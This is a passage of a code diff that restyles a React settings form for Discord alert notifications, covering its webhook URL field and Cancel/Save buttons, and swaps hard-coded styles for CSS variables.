-                <div style={{ display: 'flex', flexDirection: 'column', gap: '12px', padding: '16px', borderRadius: '10px', border: '1px solid var(--border-light)', background: 'rgba(0,0,0,0.15)' }}>
+                <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', padding: '14px', borderRadius: 'var(--radius-sm)', border: '1px solid var(--border-light)', background: 'var(--bg-surface)' }}>
                   <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                     <input 
                       type="checkbox" 
                       id="discord_enabled"
                       checked={configDiscordEnabled} 
                       onChange={(e) => setConfigDiscordEnabled(e.target.checked)}
-                      style={{ cursor: 'pointer', width: '16px', height: '16px', accentColor: '#7c4dff' }}
+                      style={{ cursor: 'pointer', width: '15px', height: '15px', accentColor: 'var(--color-primary)' }}
                     />
-                    <label htmlFor="discord_enabled" style={{ fontSize: '0.8rem', fontWeight: '800', color: '#7c4dff', cursor: 'pointer', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
-                      👾 Discord Alerts
+                    <label htmlFor="discord_enabled" style={{ fontSize: '0.8rem', fontWeight: '600', color: 'var(--text-main)', cursor: 'pointer' }}>
+                      Discord Alerts
                     </label>
                   </div>
 
                   {configDiscordEnabled && (
                     <div className="animate-fade-in" style={{ display: 'flex', flexDirection: 'column', gap: '8px', marginTop: '4px' }}>
                       <div className={styles.configField}>
-                        <label className={styles.fieldLabel} style={{ fontSize: '0.62rem' }}>Webhook URL</label>
+                        <label className={styles.fieldLabel} style={{ fontSize: '0.68rem' }}>Webhook URL</label>
                         <input 
                           type="password"
                           placeholder="https://discord.com/api/webhooks/..."
                           value={configDiscordWebhook}
                           onChange={(e) => setConfigDiscordWebhook(e.target.value)}
                           className={styles.inputField}
-                          style={{ fontSize: '0.75rem', padding: '8px 10px' }}
+                          style={{ fontSize: '0.75rem', padding: '6px 10px' }}
                         />
                       </div>
                     </div>
@@ -2991,16 +2389,16 @@ webhook:
                 type="button" 
                 onClick={() => setIsConfigOpen(false)}
                 className="btn-secondary"
-                style={{ padding: '10px 16px' }}
+                style={{ padding: '8px 16px', fontSize: '0.82rem' }}
               >
                 Cancel
               </button>
               <button 
                 type="submit" 
                 className="btn-primary"
-                style={{ padding: '10px 20px' }}
+                style={{ padding: '8px 18px', fontSize: '0.82rem' }}
               >
-                Apply Configuration
+                Save Settings
               </button>
             </div>
           </form>
